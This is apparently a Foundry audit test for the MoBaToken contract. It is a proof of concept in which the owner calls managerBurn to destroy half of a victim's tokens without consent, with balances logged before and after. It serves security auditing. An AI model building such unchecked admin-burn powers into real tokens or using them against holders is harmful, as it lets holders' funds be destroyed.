// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MoBaToken.sol";

contract MoBaTokenAuditTest is Test {
    MoBaToken public token;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    uint256 constant TOKEN_AMOUNT = 1000 ether;

    function setUp() public {
        // Deploy the token contract
        vm.startPrank(owner);
        token = new MoBaToken("MoBaToken", "MBT");
        
        // Mint tokens to victim using the cross function
        token.cross(victim, TOKEN_AMOUNT);
        vm.stopPrank();

        // Sanity check - victim should have tokens
        assertEq(token.balanceOf(victim), TOKEN_AMOUNT);
    }

    // Test demonstrating the vulnerability - owner can burn victim's tokens
    function testOwnerCanBurnArbitraryTokens() public {
        // Query and log state BEFORE attack
        console.log("--- BEFORE-Trigger ManagerBurn ---");
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("Victim balance before:", victimBalanceBefore);
        console.log("Total supply before: ", totalSupplyBefore);
        
        // Perform vulnerability trigger
        console.log("--- Trigger ManagerBurn ---");
        vm.prank(owner);
        token.managerBurn(victim, TOKEN_AMOUNT/2);
        
        // Query and log state AFTER attack
        console.log("--- AFTER-Trigger ManagerBurn ---");
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("Victim balance after: ", victimBalanceAfter);
        console.log("Total supply after:  ", totalSupplyAfter);
        
        // Calculate burned amount and state changes
        uint256 victimBalanceDiff = victimBalanceBefore - victimBalanceAfter;
        uint256 totalSupplyDiff = totalSupplyBefore - totalSupplyAfter;
        uint256 expectedBurnAmount = TOKEN_AMOUNT/2;
        
        console.log("Burn Results:");
        console.log("Victim tokens burned:         %s", victimBalanceDiff);
        console.log("Total supply reduction:       %s", totalSupplyDiff);
        console.log("Expected burn amount:         %s", expectedBurnAmount);
        
        // Verify vulnerability detection
        bool vulnerabilityExists = true;
        string memory reason = "Owner successfully burned victim tokens without consent";
        
        if (victimBalanceDiff != expectedBurnAmount) {
            vulnerabilityExists = false;
            reason = "Victim token burn amount mismatch";
        } else if (totalSupplyDiff != expectedBurnAmount) {
            vulnerabilityExists = false;
            reason = "Total supply reduction mismatch";
        } else if (victimBalanceAfter != expectedBurnAmount) {
            vulnerabilityExists = false;
            reason = "Final balance not as expected";
        }
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: %s", reason);
        } else {
            console.log("Vulnerability not Exist: %s", reason);
        }
        
        // Original assertions remain for test validation
        assertEq(token.balanceOf(victim), TOKEN_AMOUNT/2);
        assertEq(token.totalSupply(), TOKEN_AMOUNT/2);
    }
}